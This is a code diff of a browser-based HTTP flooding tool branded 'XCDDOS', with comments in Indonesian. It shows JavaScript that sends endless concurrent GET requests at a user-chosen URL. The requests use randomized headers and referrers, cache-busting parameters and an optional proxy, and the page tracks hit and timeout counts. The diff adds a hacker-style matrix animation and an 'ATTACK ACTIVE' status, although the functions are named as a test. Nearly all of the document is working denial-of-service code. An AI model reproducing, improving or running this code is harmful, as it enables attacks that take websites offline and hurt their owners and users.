+            document.getElementById('req-gagal').innerText = totalGagal.toLocaleString();
+        }
+
+        async function sendRequest(url) {
+            if (!isRunning || Date.now() > stopTime) return;
+
+            const proxyUrl = document.getElementById('proxy').value;
+            const finalUrl = proxyUrl ? proxyUrl + url : url;
+            const dynamicUrl = finalUrl + (finalUrl.includes('?') ? '&' : '?') + 'cb=' + Math.random().toString(36).substring(7);
+            const randomLang = language_header[Math.floor(Math.random() * language_header.length)];
+            const randomMenerima = menerima[Math.floor(Math.random() * menerima.length)];
+            const randomEncoding = encoding[Math.floor(Math.random() * encoding.length)];
+            const pilih = proxyUrl ? fetch_mode[3] : fetch_mode[2];
+            document.getElementById('fetch_mode_ui').innerText = pilih;
             
-          const headers = {
-                    'Accept-Language': randomLang, // Memasukkan variabel randomUA yang sebelumnya tidak terpakai
-                    'Accept': randomMenerima, // ini yang aku benarkan
+            if (isRunning) {
+                requestCount++;
+                document.getElementById('total-req').innerText = requestCount.toLocaleString();
+            }
+
+            try {
+                const controller = new AbortController();
+                const timeoutValue = parseInt(document.getElementById('timeout-ms').value) || 2000;
+                const timeoutId = setTimeout(() => controller.abort(), timeoutValue);
+                
+                const headers = {
+                    'Accept-Language': randomLang,
+                    'Accept': randomMenerima,
                     'Accept-Encoding': randomEncoding
                 };
-            const response = await fetch(dynamicUrl, {
-                method: 'GET',
-                cache: 'no-store', 
-				mode: pilih,
-                headers: headers,
-			    keepalive: true,
-                referrer: referrers[Math.floor(Math.random() * referrers.length)],
-                signal: controller.signal
-            });
-
-            clearTimeout(timeoutId);
-
-            if (isRunning) {
-                originHits++;
-                const status = response.status;
-                statusCodes[status] = (statusCodes[status] || 0) + 1;
-
-                document.getElementById('origin-hits').innerText = originHits.toLocaleString();
-                document.getElementById('req-terkirim').innerText = originHits.toLocaleString(); // Update Terkirim
-                updateStatusCodesUI();
-            }
-        } catch (e) {
-            if (e.name === 'AbortError') {
+                const response = await fetch(dynamicUrl, {
+                    method: 'GET',
+                    cache: 'no-store', 
+                    mode: pilih,
+                    headers: headers,
+                    keepalive: true,
+                    referrer: referrers[Math.floor(Math.random() * referrers.length)],
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
                 if (isRunning) {
-                    timeoutCount++;
-                    document.getElementById('timeouts').innerText = timeoutCount.toLocaleString();
-                    updateGagalUI(); // Update Gagal
+                    originHits++;
+                    const status = response.status;
+                    statusCodes[status] = (statusCodes[status] || 0) + 1;
+                    document.getElementById('origin-hits').innerText = originHits.toLocaleString();
+                    document.getElementById('req-terkirim').innerText = originHits.toLocaleString();
+                    updateStatusCodesUI();
                 }
-            } else if (e.name === 'TypeError') {
-                // Modifikasi: Cek apakah jaringan user terputus
-                if (!navigator.onLine) {
+            } catch (e) {
+                if (e.name === 'AbortError') {
                     if (isRunning) {
-                        localErrors++; // Dihitung sebagai kegagalan koneksi jaringan lokal
+                        timeoutCount++;
+                        document.getElementById('timeouts').innerText = timeoutCount.toLocaleString();
+                        updateGagalUI();
+                    }
+                } else if (e.name === 'TypeError') {
+                    if (!navigator.onLine) {
+                        if (isRunning) {
+                            localErrors++;
+                            document.getElementById('local-errors').innerText = localErrors.toLocaleString();
+                            updateGagalUI();
+                        }
+                    } else {
+                        if (isRunning) {
+                            corsErrors++;
+                            document.getElementById('cors-errors').innerText = corsErrors.toLocaleString();
+                            statusCodes['CORS Blocked'] = (statusCodes['CORS Blocked'] || 0) + 1;
+                            updateStatusCodesUI();
+                            updateGagalUI();
+                        }
+                    }
+                } else {
+                    if (isRunning) {
+                        localErrors++;
                         document.getElementById('local-errors').innerText = localErrors.toLocaleString();
                         updateGagalUI();
                     }
-                } else {
-                    // TypeError pada Fetch biasanya disebabkan oleh kebijakan CORS Browser.
-                    // Request tetap menyentuh server target, jadi Origin Hits ditambahkan.
-                    if (isRunning) {
-                       // originHits++;
-                        corsErrors++;
+                }
+            }
+            if (isRunning) {
+                const jitter = Math.floor(Math.random() * 10);
+                setTimeout(() => sendRequest(url), jitter);
+            }
+        }
 
-                        //document.getElementById('origin-hits').innerText = originHits.toLocaleString();
-                        document.getElementById('cors-errors').innerText = corsErrors.toLocaleString();
+        function startTest() {
+            const targetUrl = document.getElementById('url').value;
+            const duration = parseInt(document.getElementById('duration').value);
+            const threads = parseInt(document.getElementById('threads').value);
+            if (!targetUrl.startsWith('http')) {
+                alert('Masukkan URL yang valid (http:// atau https://)');
+                return;
+            }
+            isRunning = true;
+            requestCount = 0;
+            originHits = 0;
+            timeoutCount = 0;
+            corsErrors = 0;
+            localErrors = 0;
+            statusCodes = {};
+            stopTime = Date.now() + (duration * 1000);
+            document.getElementById('start-btn').style.display = 'none';
+            document.getElementById('stop-btn').style.display = 'block';
+            document.getElementById('status').innerText = '⚡ ATTACK ACTIVE ⚡';
+            document.getElementById('status').style.color = '#0f0';
+            document.getElementById('total-req').innerText = '0';
+            document.getElementById('origin-hits').innerText = '0';
+            document.getElementById('timeouts').innerText = '0';
+            document.getElementById('cors-errors').innerText = '0';
+            document.getElementById('local-errors').innerText = '0';
+            document.getElementById('req-terkirim').innerText = '0';
+            document.getElementById('req-gagal').innerText = '0';
+            updateStatusCodesUI();
+            resolveTargetIP(targetUrl);
+            for (let i = 0; i < threads; i++) {
+                sendRequest(targetUrl);
+            }
+            const startTime = Date.now();
+            const timerInterval = setInterval(() => {
+                const now = Date.now();
+                const elapsed = now - startTime;
+                const remaining = Math.max(0, Math.ceil((stopTime - now) / 1000));
+                const progress = (elapsed / (duration * 1000)) * 100;
+                document.getElementById('timer').innerText = remaining + 's';
+                document.getElementById('progress-bar').style.width = Math.min(progress, 100) + '%';
+                if (now > stopTime || !isRunning) {
+                    clearInterval(timerInterval);
+                    stopTest();
+                }
+            }, 100);
+        }
 
-                        statusCodes['CORS Blocked'] = (statusCodes['CORS Blocked'] || 0) + 1;
-                        updateStatusCodesUI();
-                        updateGagalUI(); // Update Gagal
+        function stopTest() {
+            isRunning = false;
+            document.getElementById('start-btn').style.display = 'block';
+            document.getElementById('stop-btn').style.display = 'none';
+            document.getElementById('status').innerText = '● TERMINATED ●';
+            document.getElementById('status').style.color = '#ff7777';
+        }
+    </script>
+
+    <script>
+        // ========== MATRIX RAIN: HUJAN ANGKA 1 & 0 + TULISAN "XCDDOS" ==========
+        (function() {
+            const canvas = document.getElementById('matrix-canvas');
+            let ctx = canvas.getContext('2d');
+            let drops = [];
+            let animationId = null;
+            let canvasWidth = window.innerWidth;
+            let canvasHeight = window.innerHeight;
+
+            // karakter khusus: 0 , 1 dan kata XCDDOS (akan jatuh sebagai teks utuh)
+            const digitChars = ['0', '1'];
+            const xcddosWord = 'XCDDOS';
+            
+            function resizeCanvas() {
+                canvasWidth = window.innerWidth;
+                canvasHeight = window.innerHeight;
+                canvas.width = canvasWidth;
+                canvas.height = canvasHeight;
+                initDrops();
+            }
+
+            function initDrops() {
+                drops = [];
+                // jumlah partikel jatuh (sekitar 180 - 280 agar ramai)
+                let particleCount = Math.floor(canvasWidth / 12) + 80;
+                if (particleCount > 360) particleCount = 360;
+                for (let i = 0; i < particleCount; i++) {
+                    drops.push({
+                        x: Math.random() * canvasWidth,
+                        y: Math.random() * canvasHeight,
+                        speed: 2 + Math.random() * 6,
+                        // 65% chance angka 0/1 , 35% chance XCDDOS (hujan tulisan)
+                        text: Math.random() < 0.65 ? digitChars[Math.floor(Math.random() * digitChars.length)] : xcddosWord,
+                        fontSize: 16 + Math.floor(Math.random() * 6),
+                        opacity: 0.7 + Math.random() * 0.5,
+                    });
+                }
+            }
+
+            function drawMatrix() {
+                if (!ctx) return;
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.12)';  // trailing effect
+                ctx.fillRect(0, 0, canvasWidth, canvasHeight);
+                
+                for (let i = 0; i < drops.length; i++) {
+                    const d = drops[i];
+                    // warna hijau neon hacker
+                    const greenShade = `rgba(50, 255, 50, ${d.opacity * 0.9})`;
+                    ctx.font = `${d.fontSize}px 'Courier New', monospace`;
+                    ctx.fillStyle = greenShade;
+                    ctx.shadowBlur = 4;
+                    ctx.shadowColor = '#0f0';
+                    
+                    // draw text (bisa 0/1 atau XCDDOS)
+                    ctx.fillText(d.text, d.x, d.y);
+                    
+                    // pergerakan
+                    d.y += d.speed;
+                    // reset jika keluar layar
+                    if (d.y > canvasHeight + 50) {
+                        d.y = -30;
+                        d.x = Math.random() * canvasWidth;
+                        // perbaharui text saat reset biar tetap dinamis
+                        d.text = Math.random() < 0.65 ? digitChars[Math.floor(Math.random() * digitChars.length)] : xcddosWord;
+                        d.speed = 2 + Math.random() * 7;
+                    }
+                    // slight random drift
+                    if (Math.random() < 0.02) {
+                        d.x += (Math.random() - 0.5) * 3;
+                        if (d.x < 0) d.x = 5;
+                        if (d.x > canvasWidth) d.x = canvasWidth - 15;
                     }
                 }
-            } else {
-                // Error lainnya dihitung murni sebagai Local Error
-                if (isRunning) {
-                    localErrors++;
-                    document.getElementById('local-errors').innerText = localErrors.toLocaleString();
-                    updateGagalUI(); // Update Gagal
-                }
+                animationId = requestAnimationFrame(drawMatrix);
             }
-        }
 
-        if (isRunning) {
-            const jitter = Math.floor(Math.random() * 10);
-            setTimeout(() => sendRequest(url), jitter);
-        }
-    }
-
-    function startTest() {
-        const targetUrl = document.getElementById('url').value;
-        const duration = parseInt(document.getElementById('duration').value);
-        const threads = parseInt(document.getElementById('threads').value);
-
-        if (!targetUrl.startsWith('http')) {
-            alert('Masukkan URL yang valid (harus memakai http:// atau https://)');
-            return;
-        }
-
-        isRunning = true;
-        requestCount = 0;
-        originHits = 0;
-        timeoutCount = 0;
-        corsErrors = 0;
-        localErrors = 0;
-        statusCodes = {};
-        stopTime = Date.now() + (duration * 1000);
-
-        document.getElementById('start-btn').style.display = 'none';
-        document.getElementById('stop-btn').style.display = 'block';
-        document.getElementById('status').innerText = 'Running...';
-        document.getElementById('status').style.color = '#3fb950';
-        document.getElementById('total-req').innerText = '0';
-        document.getElementById('origin-hits').innerText = '0';
-        document.getElementById('timeouts').innerText = '0';
-        document.getElementById('cors-errors').innerText = '0';
-        document.getElementById('local-errors').innerText = '0';
-
-        // Reset statistik baru
-        document.getElementById('req-terkirim').innerText = '0';
-        document.getElementById('req-gagal').innerText = '0';
-
-        updateStatusCodesUI();
-
-        // Panggil fungsi resolve IP sebelum memulai threads
-        resolveTargetIP(targetUrl);
-
-        for (let i = 0; i < threads; i++) {
-            sendRequest(targetUrl);
-        }
-
-        const startTime = Date.now();
-        const timerInterval = setInterval(() => {
-            const now = Date.now();
-            const elapsed = now - startTime;
-            const remaining = Math.max(0, Math.ceil((stopTime - now) / 1000));
-            const progress = (elapsed / (duration * 1000)) * 100;
-
-            document.getElementById('timer').innerText = remaining + 's';
-            document.getElementById('progress-bar').style.width = Math.min(progress, 100) + '%';
-
-            if (now > stopTime || !isRunning) {
-                clearInterval(timerInterval);
-                stopTest();
-            }
-        }, 100);
-    }
-
-    function stopTest() {
-        isRunning = false;
-        document.getElementById('start-btn').style.display = 'block';
-        document.getElementById('stop-btn').style.display = 'none';
-        document.getElementById('status').innerText = 'Finished';
-        document.getElementById('status').style.color = '#c9d1d9';
-    }
-</script>
-
-  </body>
+            window.addEventListener('resize', () => {
+                resizeCanvas();
+            });
+            
+            resizeCanvas();
+            drawMatrix();
+        })();
+    </script>
+</body>
 </html>
